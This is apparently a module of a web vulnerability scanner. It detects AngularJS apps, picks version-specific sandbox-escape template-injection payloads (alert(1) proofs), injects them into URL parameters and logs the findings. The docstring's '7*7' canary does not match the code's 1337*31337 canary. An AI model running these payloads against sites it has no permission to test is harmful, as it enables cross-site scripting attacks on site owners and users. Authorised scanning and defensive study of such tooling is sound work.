"""
AngularJS Template Injection → XSS Scanner

AngularJS evaluates {{ }} expressions in the DOM. If user input is reflected
inside an ng-app scope without sanitization, arbitrary JS can execute.

Attack chain:
  1. Detect AngularJS on page (ng-app attribute, angular.js script, angular.version)
  2. Detect AngularJS version (sandbox present in 1.x < 1.6, removed in 1.6+)
  3. Inject template expression payloads into URL parameters
  4. Check if response reflects payload in a way that AngularJS would evaluate

Supported AngularJS versions:
  - 1.0.x - 1.1.x  : No sandbox
  - 1.2.x - 1.5.x  : Sandbox (escapable with known bypasses)
  - 1.6.x+          : Sandbox removed — {{alert(1)}} works directly
  - 2.x / Angular   : Not vulnerable to template injection this way
"""

from __future__ import annotations

import re
import logging
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger("akha.angular")

_NG_APP_RE = re.compile(r'ng-app', re.IGNORECASE)
_NG_CONTROLLER_RE = re.compile(r'ng-controller', re.IGNORECASE)
_ANGULAR_SCRIPT_RE = re.compile(
    r'<script[^>]+src=["\'][^"\']*angular(?:\.min)?\.js["\']', re.IGNORECASE
)
_ANGULAR_VERSION_RE = re.compile(
    r'angular[.\s]*version["\s]*[:=]["\s]*[{"\s]*full["\s]*:["\s]*"(\d+\.\d+\.\d+)"',
    re.IGNORECASE,
)
_ANGULAR_CDN_VERSION_RE = re.compile(
    r'ajax\.googleapis\.com/ajax/libs/angularjs/(\d+\.\d+)', re.IGNORECASE
)


class AngularJSScanner:
    """
    Detect and exploit AngularJS client-side template injection (CSTI).

    Usage:
        scanner = AngularJSScanner(http_client, config)
        findings = scanner.scan(url, parameters)
    """

    CANARY_PAYLOAD = '{{1337*31337}}'
    CANARY_RESULT = '41897569'


    NO_SANDBOX_PAYLOADS = [
        '{{alert(1)}}',
        '{{constructor.constructor("alert(1)")()}}',
        '{{"a".constructor.prototype.charAt=[].join;$eval("x=alert(1)")}}',
        '{{$on.constructor("alert(1)")()}}',
        '{{[].filter.constructor("alert(1)")()}}',
        '{{({}+[]).constructor.constructor("alert(1)")()}}',
    ]

    SANDBOX_V12_PAYLOADS = [
        '{{"a".constructor.prototype.charAt=[].join;$eval(\'x=alert(1)\')}}',
        '{{{}[{toString:[].join,length:1,0:"__proto__"}].assign=[].join;'
        '"a".constructor.prototype.charAt=[].join;$eval(\'x=alert(1)\')}}',
    ]

    SANDBOX_V13_PAYLOADS = [
        '{{"a".constructor.prototype.charAt=[].join;'
        '$eval(\'x=1\') & $on.constructor(\'alert(1)\')()}}',
        '{{!ready && (ready = true) && ('
        '!call ? $$watchers[0].get(toString.constructor.prototype) :'
        '(a = apply) &&'
        '(apply = $parse) &&'
        '(call = toString) &&'
        '($$watchers[0].get(toString.constructor.prototype)) '
        ') | a}}',
    ]

    SANDBOX_V14_PAYLOADS = [
        '{{"a".constructor.prototype.charAt=[].join;'
        '$eval(\'x=alert(1)\')}}',
        '{{"a"[{toString:false,valueOf:[].join,length:1,0:"__proto__"}]='
        '"\\xe2\\x80\\xa6";[]["__proto__"]["split"]=[].join;'
        '$eval(\'x=1\') | $on.constructor(\'alert(1)\')()}}',
    ]

    SANDBOX_V15_PAYLOADS = [
        '{{x = {"y":"".constructor.prototype}; x["y"].charAt=[].join;$eval("x=alert(1)")}}',
        '{{"a".constructor.prototype.charAt=[].join;'
        '$eval(\'x=alert(1)\')}}',
    ]

    UNIVERSAL_PAYLOADS = [
        CANARY_PAYLOAD,                   # Detection canary — unique numeric output
        '{{constructor.constructor("alert(document.domain)")()}}',
        '{{"".sub.call.call({}.isPrototypeOf.bind.call(\'".\'[0],"$scope"),"alert(1)")}}',
    ]

    def __init__(self, http_client, config, execution_verifier=None):
        self.client = http_client
        self.config = config
        self.verifier = execution_verifier
        self._stopped = False

    def stop(self):
        self._stopped = True


    def scan(self, url: str, parameters: List[Dict]) -> List[Dict]:
        """
        Full AngularJS CSTI scan:
          1. Detect AngularJS on page
          2. Determine version
          3. Select appropriate payloads
          4. Test each parameter
        """
        findings = []

        try:
            response = self.client.get(url, timeout=self.config.timeout)
            html = response.text
        except Exception:
            return findings

        angular_version = self.detect_angular(html)
        if not angular_version:
            return findings  # Not an AngularJS app

        if self.config.verbose:
            logger.info("AngularJS detected at %s (version hint: %s)", url, angular_version)

        payloads = self._select_payloads(angular_version)

        for param in parameters:
            if self._stopped:
                break

            param_name = param.get('name', '')
            location = param.get('location', 'query')

            if location not in ('query', 'url', 'GET', 'path'):
                continue

            for payload in payloads:
                if self._stopped:
                    break

                try:
                    test_url = self._build_url(url, param_name, payload)
                    resp = self.client.get(test_url, timeout=self.config.timeout)
                    body = resp.text

                    hit = self._check_response(body, payload)
                    if hit not in ('evaluated', 'reflected'):
                        continue

                    executed = False
                    exec_evidence = None
                    if self.verifier and '{{alert' in payload:
                        try:
                            result = self.verifier.verify(test_url, payload)
                            executed = result.executed
                            exec_evidence = result.evidence
                        except Exception:
                            logger.debug("Suppressed exception", exc_info=True)

                    confidence = 90 if executed else (75 if hit == 'evaluated' else 55)
                    status = 'Vulnerability Detected' if executed else (
                        'AngularJS CSTI Confirmed' if hit == 'evaluated' else
                        'Potential AngularJS CSTI'
                    )

                    findings.append({
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'test_url': test_url,
                        'type': 'angular_template_injection',
                        'subtype': f'AngularJS CSTI (v{angular_version})',
                        'status': status,
                        'confidence': confidence,
                        'context': {'Location': 'HTML', 'Type': 'AngularJS CSTI'},
                        'bypass_technique': f'AngularJS Template Injection v{angular_version}',
                        'proof': (
                            f'AngularJS template injection detected.\n'
                            f'Version: {angular_version}\n'
                            f'Payload: {payload}\n'
                            f'Detection method: {hit}\n'
                            + (f'Browser confirmed: {exec_evidence}' if executed else '')
                        ),
                        'request': f'GET {test_url} HTTP/1.1\nHost: {urlparse(url).netloc}',
                        'response': body[:500],
                        'validated': executed,
                        'angular_version': angular_version,
                    })

                    break

                except Exception as e:
                    if self.config.verbose:
                        logger.debug("Angular test error: %s", e)
                    continue

        return findings


    def detect_angular(self, html: str) -> Optional[str]:
        """
        Detect AngularJS presence and return version hint.
        Returns None if AngularJS not detected.
        Returns version string like '1.6', '1.2', or 'unknown' if detected but version unclear.
        """
        has_ng_app = bool(_NG_APP_RE.search(html))
        has_ng_ctrl = bool(_NG_CONTROLLER_RE.search(html))
        has_script = bool(_ANGULAR_SCRIPT_RE.search(html))

        if not (has_ng_app or has_ng_ctrl or has_script):
            return None

        m = _ANGULAR_VERSION_RE.search(html)
        if m:
            ver = m.group(1)  # e.g. "1.6.4"
            return ver

        m = _ANGULAR_CDN_VERSION_RE.search(html)
        if m:
            return m.group(1)  # e.g. "1.6"

        return 'unknown'


    def _select_payloads(self, version: str) -> List[str]:
        """Select payloads appropriate for detected AngularJS version"""
        payloads = list(self.UNIVERSAL_PAYLOADS)

        if version == 'unknown':
            payloads += self.SANDBOX_V12_PAYLOADS
            payloads += self.SANDBOX_V13_PAYLOADS
            payloads += self.SANDBOX_V14_PAYLOADS
            payloads += self.NO_SANDBOX_PAYLOADS
            payloads += self.SANDBOX_V15_PAYLOADS
            return payloads

        try:
            parts = version.split('.')
            major = int(parts[0])
            minor = int(parts[1]) if len(parts) > 1 else 0
        except (ValueError, IndexError):
            payloads += self.NO_SANDBOX_PAYLOADS
            return payloads

        if major >= 2:
            return []

        if major == 1:
            if minor >= 6:
                payloads += self.NO_SANDBOX_PAYLOADS
            elif minor >= 5:
                payloads += self.SANDBOX_V15_PAYLOADS
                payloads += self.NO_SANDBOX_PAYLOADS
            elif minor >= 4:
                payloads += self.SANDBOX_V14_PAYLOADS
            elif minor >= 3:
                payloads += self.SANDBOX_V13_PAYLOADS
            elif minor >= 2:
                payloads += self.SANDBOX_V12_PAYLOADS
            else:
                payloads += self.NO_SANDBOX_PAYLOADS

        return payloads


    def _check_response(self, body: str, payload: str) -> Optional[str]:
        """
        Check if AngularJS evaluated the payload.
        Returns:
          'evaluated' — arithmetic canary evaluated (49 for 7*7)
          'reflected' — payload reflected raw (may be evaluated client-side)
          None        — no hit
        """
        if payload == self.CANARY_PAYLOAD and self.CANARY_RESULT in body and payload not in body:
            return 'evaluated'

        if payload in body:
            return 'reflected'

        inner = payload.strip('{}')
        if inner and inner in body:
            return 'stripped'

        return None


    def _build_url(self, url: str, param_name: str, payload: str) -> str:
        """Build test URL with Angular payload in parameter"""
        parsed = urlparse(url)
        params = dict(parse_qs(parsed.query))
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment,
        ))
